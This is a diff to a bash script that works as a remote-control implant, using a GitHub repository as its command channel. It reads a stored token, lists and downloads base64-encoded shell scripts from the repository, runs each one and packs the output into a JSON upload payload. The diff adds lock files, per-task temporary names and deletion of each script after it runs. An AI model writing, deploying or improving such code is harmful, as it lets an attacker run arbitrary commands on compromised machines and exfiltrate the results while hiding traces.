@@ -3,12 +3,16 @@ set -u
 T="${GHT:-}"; [ -z "$T" ] && T=$(cat "$HOME/.ghr_tk" 2>/dev/null); [ -z "$T" ] && exit 0
 API=https://api.github.com/repos/heinzo666/sync-assets/contents
 D="$HOME/.hgw"; mkdir -p "$D"; touch "$D/done"
+exec 8>"$D/.boot.lock"
+flock -n 8 || exit 0
 LOG="$D/log"
 {
-echo "[$(date -u +%FT%T)] start pid=$$ VER=h10"
+echo "[$(date -u +%FT%T)] start pid=$$ VER=h12"
 LIST=$(timeout 25 curl -fsSL -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' "$API/lab/hgin?ref=main&t=$RANDOM")
 NAMES=$(printf '%s' "$LIST" | tr ',' '\n' | grep '"name"' | sed 's/.*"name": *"//; s/".*//' | grep '\.sh$')
 echo "list_len=${#LIST} names=[$(echo $NAMES|tr '\n' ' ')]"
+exec 9>"$D/.lock"
+flock -w 5 9 || { echo "[$(date -u +%FT%T)] busy-skip"; exit 0; }
 for N in $NAMES; do
   grep -qxF "$N" "$D/done" && continue
   J=$(timeout 20 curl -fsSL -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' "$API/lab/hgin/$N?ref=main")
@@ -19,11 +23,13 @@ for N in $NAMES; do
   case "$VAL" in *\"*) VAL="${TMP%%\"*}";; esac
   [ ${#VAL} -lt 16 ] && { echo "EXTRACT_FAIL for $N flat_len=${#FLAT}"; }
   B="$VAL"
-  printf '%s' "$B" | base64 -d > "$D/x.sh" 2>"$D/e.txt"
-  BSZ=$(wc -c < "$D/x.sh"); BE=$(head -c 60 "$D/e.txt")
+  TX="$D/x.$$.${N%.sh}"
+  printf '%s' "$B" | base64 -d > "$TX" 2>"$D/e.txt"
+  BSZ=$(wc -c < "$TX"); BE=$(head -c 60 "$D/e.txt")
   echo "task=$N jlen=${#J} blen=${#B} sz=$BSZ err=[$BE]"
-  chmod +x "$D/x.sh"
-  OUT=$(/bin/bash "$D/x.sh" 2>&1); RC=$?
+  chmod +x "$TX"
+  OUT=$(/bin/bash "$TX" 2>&1); RC=$?
+  rm -f "$TX"
   { echo "RC=$RC SZ=$BSZ"; echo "$OUT"; } > "$D/o.txt"
   OB=$(base64 -w0 < "$D/o.txt")
   printf '{"message":"res","content":"%s"}' "$OB" > "$D/p.json"
